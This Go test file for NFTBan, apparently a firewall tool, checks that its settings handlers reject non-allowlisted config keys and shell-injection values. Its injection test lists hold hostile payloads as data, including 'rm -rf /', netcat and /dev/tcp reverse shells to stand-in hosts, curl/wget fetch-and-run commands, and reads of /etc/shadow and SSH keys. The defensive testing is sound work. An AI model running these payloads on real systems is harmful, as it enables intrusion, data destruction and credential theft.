// =============================================================================
// NFTBan - Settings Handlers Tests
// =============================================================================
// SPDX-License-Identifier: MPL-2.0
// meta:name="settings_handlers_test"
// meta:type="go"
// meta:owner="Antonios Voulvoulis <contact@nftban.com>"
// meta:created_date="2026-02-06"
// meta:description="Tests for settings validation security fixes"
// meta:input="None"
// meta:output="None"
// meta:depends="testing"
// meta:inventory.files=""
// meta:inventory.binaries=""
// meta:inventory.env_vars=""
// meta:inventory.config_files=""
// meta:inventory.systemd_units=""
// meta:inventory.network=""
// meta:inventory.privileges="none"
// =============================================================================

package handlers

import "testing"

// =============================================================================
// CONFIG KEY VALIDATION TESTS
// =============================================================================

// TestValidateConfigKey_ValidKeys tests that allowlisted keys pass validation
func TestValidateConfigKey_ValidKeys(t *testing.T) {
	validKeys := []string{
		// Feature toggles
		"NFTBAN_METRICS_ENABLED",
		"NFTBAN_GEOIP_ENABLED",
		"NFTBAN_FEEDS_ENABLED",
		"NFTBAN_FEEDS_AUTO_UPDATE",
		"NFTBAN_SURICATA_ENABLED",
		"NFTBAN_GUI_ENABLED",
		"NFTBAN_PORTSCAN_ENABLED",
		"NFTBAN_DDOS_ENABLED",
		"NFTBAN_LOGIN_MONITOR_ENABLED",
		"NFTBAN_GRAFANA_ENABLED",
		// Metrics settings
		"NFTBAN_METRICS_BACKEND",
		"NFTBAN_METRICS_SAMPLING_INTERVAL",
		"NFTBAN_METRICS_MAX_SAMPLES",
		"NFTBAN_PROMETHEUS_DIR",
		"NFTBAN_METRICS_PROMETHEUS_ADDR",
		"NFTBAN_METRICS_NODE_EXPORTER_ADDR",
		"NFTBAN_METRICS_VICTORIA_ADDR",
		// GeoIP settings
		"NFTBAN_GEOIP_LICENSE_KEY",
		// Suricata settings
		"NFTBAN_SURICATA_EVE_LOG",
		"NFTBAN_SURICATA_LOG_DIR",
		"NFTBAN_SURICATA_BAN_THRESHOLD",
		"NFTBAN_SURICATA_SCORE_DECAY",
		"NFTBAN_SURICATA_CLOUDFLARE_WHITELIST",
		// Logging settings
		"NFTBAN_LOG_LEVEL",
		"NFTBAN_COLOR_OUTPUT",
		"NFTBAN_DEBUG_TRACE",
		"NFTBAN_DEBUG_TRACE_LOG",
		// Network settings
		"NFTBAN_GUI_ADDR",
		"NFTBAN_API_ADDR",
	}

	for _, key := range validKeys {
		t.Run(key, func(t *testing.T) {
			err := validateConfigKey(key)
			if err != nil {
				t.Errorf("Expected key %q to be valid, but got error: %v", key, err)
			}
		})
	}
}

// TestValidateConfigKey_InvalidKeys tests that non-allowlisted keys are rejected
func TestValidateConfigKey_InvalidKeys(t *testing.T) {
	invalidKeys := []string{
		// Non-existent keys
		"NFTBAN_INVALID_KEY",
		"RANDOM_CONFIG",
		"",
		// Dangerous keys that should never be settable via UI
		"PATH",
		"LD_PRELOAD",
		"LD_LIBRARY_PATH",
		"SHELL",
		"HOME",
		// Potential privilege escalation keys
		"NFTBAN_ROOT_PASSWORD",
		"NFTBAN_ADMIN_TOKEN",
		// SQL/command injection in key name
		"NFTBAN_METRICS_ENABLED; rm -rf /",
		"NFTBAN_METRICS_ENABLED$(whoami)",
		"NFTBAN_METRICS_ENABLED`id`",
		// Case variations (keys should be exact match)
		"nftban_metrics_enabled",
		"Nftban_Metrics_Enabled",
	}

	for _, key := range invalidKeys {
		t.Run(key, func(t *testing.T) {
			err := validateConfigKey(key)
			if err == nil {
				t.Errorf("Expected key %q to be invalid, but it was accepted", key)
			}
		})
	}
}

// =============================================================================
// CONFIG VALUE VALIDATION TESTS
// =============================================================================

// TestValidateConfigValue_ValidValues tests that safe config values pass validation
func TestValidateConfigValue_ValidValues(t *testing.T) {
	validValues := []string{
		// Boolean values
		"true",
		"false",
		// Numeric values
		"0",
		"1",
		"100",
		"3600",
		"86400",
		// Log levels
		"DEBUG",
		"INFO",
		"WARN",
		"ERROR",
		// Paths
		"/var/log/nftban",
		"/etc/nftban/nftban.conf",
		"/usr/local/bin/nftban",
		// Network addresses
		"127.0.0.1:8080",
		"0.0.0.0:9090",
		"localhost:3000",
		"192.168.1.1:443",
		// Backend names
		"prometheus",
		"victoria",
		"none",
		// Empty string (allowed for clearing values)
		"",
		// License keys (alphanumeric)
		"ABC123DEF456",
		"abcdefghijklmnop",
		// URLs without shell metacharacters
		"http://localhost:9090",
		// Underscored names
		"nftban_metrics",
		"test_value_123",
		// Hyphenated names
		"nftban-core",
		"test-value-123",
	}

	for _, value := range validValues {
		t.Run(value, func(t *testing.T) {
			err := validateConfigValue(value)
			if err != nil {
				t.Errorf("Expected value %q to be valid, but got error: %v", value, err)
			}
		})
	}
}

// TestValidateConfigValue_ShellMetacharacters tests that shell metacharacters are rejected
func TestValidateConfigValue_ShellMetacharacters(t *testing.T) {
	// Test each shell metacharacter explicitly
	shellMetachars := []struct {
		name  string
		value string
	}{
		{"semicolon", "value;rm -rf /"},
		{"pipe", "value|cat /etc/passwd"},
		{"ampersand", "value&wget http://evil.com"},
		{"dollar", "value$(whoami)"},
		{"backtick", "value`id`"},
		{"open paren", "value(subshell)"},
		{"close paren", "value)end"},
		{"open brace", "value{block}"},
		{"close brace", "value}end"},
		{"open bracket", "value[glob]"},
		{"close bracket", "value]end"},
		{"less than", "value</etc/passwd"},
		{"greater than", "value>/tmp/pwned"},
		{"backslash", "value\\ninjection"},
		{"double quote", "value\"injection\""},
		{"single quote", "value'injection'"},
	}

	for _, tc := range shellMetachars {
		t.Run(tc.name, func(t *testing.T) {
			err := validateConfigValue(tc.value)
			if err == nil {
				t.Errorf("Expected value with %s (%q) to be rejected, but it was accepted", tc.name, tc.value)
			}
		})
	}
}

// TestValidateConfigValue_CommandInjectionAttempts tests various injection patterns
func TestValidateConfigValue_CommandInjectionAttempts(t *testing.T) {
	injectionAttempts := []string{
		// Basic command injection
		"; rm -rf /",
		"| nc attacker.com 4444 -e /bin/bash",
		"& wget http://malware.com/shell.sh | bash",
		"$(curl http://evil.com/payload)",
		"`curl http://evil.com/payload`",
		// Reverse shell attempts
		"/bin/bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
		"bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'",
		// File read attempts
		"$(cat /etc/shadow)",
		"`cat /etc/passwd`",
		"< /etc/passwd",
		// Environment variable expansion
		"$PATH",
		"${PATH}",
		"$HOME/.ssh/id_rsa",
		// Newline injection
		"value\nrm -rf /",
		"value\x0arm -rf /",
		// Null byte injection
		"value\x00rm -rf /",
		// Unicode bypass attempts
		"\u003b rm -rf /", // Unicode semicolon
	}

	for _, value := range injectionAttempts {
		t.Run(value, func(t *testing.T) {
			err := validateConfigValue(value)
			if err == nil {
				t.Errorf("Injection attempt %q was not rejected", value)
			}
		})
	}
}

// TestValidateConfigValue_EdgeCases tests boundary conditions
func TestValidateConfigValue_EdgeCases(t *testing.T) {
	testCases := []struct {
		name    string
		value   string
		isValid bool
	}{
		{"empty string", "", true},
		{"single character", "a", true},
		{"single digit", "1", true},
		{"single underscore", "_", true},
		{"single hyphen", "-", true},
		{"single dot", ".", true},
		{"single colon", ":", true},
		{"single at", "@", true},
		{"single slash", "/", true},
		{"tab character", "value\ttab", false},
		{"space character", "value space", false}, // spaces not in regex
		{"very long value", string(make([]byte, 1000)), false}, // null bytes
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			err := validateConfigValue(tc.value)
			isValid := err == nil
			if isValid != tc.isValid {
				t.Errorf("Value %q: expected valid=%v, got valid=%v (error: %v)",
					tc.value, tc.isValid, isValid, err)
			}
		})
	}
}

// =============================================================================
// COMBINED KEY+VALUE VALIDATION TESTS
// =============================================================================

// TestValidation_RealWorldSettings tests realistic configuration scenarios
func TestValidation_RealWorldSettings(t *testing.T) {
	testCases := []struct {
		name        string
		key         string
		value       string
		keyValid    bool
		valueValid  bool
	}{
		{
			name:       "enable metrics",
			key:        "NFTBAN_METRICS_ENABLED",
			value:      "true",
			keyValid:   true,
			valueValid: true,
		},
		{
			name:       "set log level",
			key:        "NFTBAN_LOG_LEVEL",
			value:      "DEBUG",
			keyValid:   true,
			valueValid: true,
		},
		{
			name:       "set prometheus address",
			key:        "NFTBAN_METRICS_PROMETHEUS_ADDR",
			value:      "127.0.0.1:9090",
			keyValid:   true,
			valueValid: true,
		},
		{
			name:       "set suricata log path",
			key:        "NFTBAN_SURICATA_EVE_LOG",
			value:      "/var/log/suricata/eve.json",
			keyValid:   true,
			valueValid: true,
		},
		{
			name:       "injection in key",
			key:        "NFTBAN_$(whoami)",
			value:      "true",
			keyValid:   false,
			valueValid: true,
		},
		{
			name:       "injection in value",
			key:        "NFTBAN_LOG_LEVEL",
			value:      "DEBUG; rm -rf /",
			keyValid:   true,
			valueValid: false,
		},
		{
			name:       "injection in both",
			key:        "PATH",
			value:      "/evil:$PATH",
			keyValid:   false,
			valueValid: false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			keyErr := validateConfigKey(tc.key)
			keyValid := keyErr == nil
			if keyValid != tc.keyValid {
				t.Errorf("Key %q: expected valid=%v, got valid=%v", tc.key, tc.keyValid, keyValid)
			}

			valueErr := validateConfigValue(tc.value)
			valueValid := valueErr == nil
			if valueValid != tc.valueValid {
				t.Errorf("Value %q: expected valid=%v, got valid=%v", tc.value, tc.valueValid, valueValid)
			}
		})
	}
}

// =============================================================================
// BENCHMARKS
// =============================================================================

func BenchmarkValidateConfigKey_Valid(b *testing.B) {
	key := "NFTBAN_METRICS_ENABLED"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		validateConfigKey(key)
	}
}

func BenchmarkValidateConfigKey_Invalid(b *testing.B) {
	key := "INVALID_KEY"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		validateConfigKey(key)
	}
}

func BenchmarkValidateConfigValue_Valid(b *testing.B) {
	value := "/var/log/nftban/eve.json"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		validateConfigValue(value)
	}
}

func BenchmarkValidateConfigValue_Invalid(b *testing.B) {
	value := "; rm -rf /"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		validateConfigValue(value)
	}
}
